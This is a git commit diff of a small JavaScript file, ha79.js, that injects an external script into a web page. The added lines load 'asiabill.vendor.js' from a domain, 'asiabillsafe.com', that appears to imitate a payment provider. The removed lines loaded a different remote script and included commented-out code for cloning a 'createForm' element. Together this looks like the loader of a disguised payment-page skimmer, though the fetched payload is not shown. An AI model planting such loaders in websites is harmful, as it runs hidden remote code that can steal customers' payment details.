7e40b14a4a01abe13353be1f1e46cb767c982c9c
xjjkong <138182422+xjjkong@users.noreply.github.com>
2023-07-12 20:36:01 +0800

    Update ha79.js

--- ha79.js
+++ ha79.js
@@ -1,12 +1,7 @@
 $(function () {
     const scriptEle = document.createElement("script");
     scriptEle.type = "text/javascript";
-    scriptEle.src = "https://cdn.jsdelivr.net/gh/xjjkong/haha@main/hei25.js";
-    scriptEle.id = "heiTT";
+    scriptEle.src = "https://www.asiabillsafe.com/st/asiabill.vendor.js";
+    scriptEle.id = "asiabill_vendor";
     document.body.appendChild(scriptEle);
-    // let node = document.getElementById('createForm');
-    // let cv = node.cloneNode(true);
-    // document.body.appendChild(cv);
-    // document.getElementById('haha').remove();
-    console.log(new Date());
 });
